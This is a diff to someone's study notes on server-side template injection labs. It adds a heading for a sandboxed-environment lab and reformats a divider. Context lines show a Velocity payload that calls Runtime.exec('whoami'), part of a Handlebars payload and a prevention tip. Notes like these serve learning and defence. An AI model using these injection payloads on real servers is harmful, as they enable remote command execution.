@@ -49,7 +49,9 @@ wrtz{{#with "s" as |string|}}
 {{/with}}
 {{/with}}
 {{/with}}
---------------------------------------------------------------------Velocity:
+--------------------------------------------------------------------
+Velocity:
+
 #set($str=$class.inspect("java.lang.String").type)
 #set($chr=$class.inspect("java.lang.Character").type)
 #set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
@@ -163,6 +165,10 @@ Jinja2 - Python/Flask Template engine
      3.Submit the key 
 
 ----------------------------------------------------------------------------------------------------------------------------------
+
+#6 Lab: Server-side template injection in a sandboxed environment
+
+    1.
 
 
 PREVENTION OF SSTI:- The best way to prevent server-side template injection is to not allow any users to modify or submit new templates
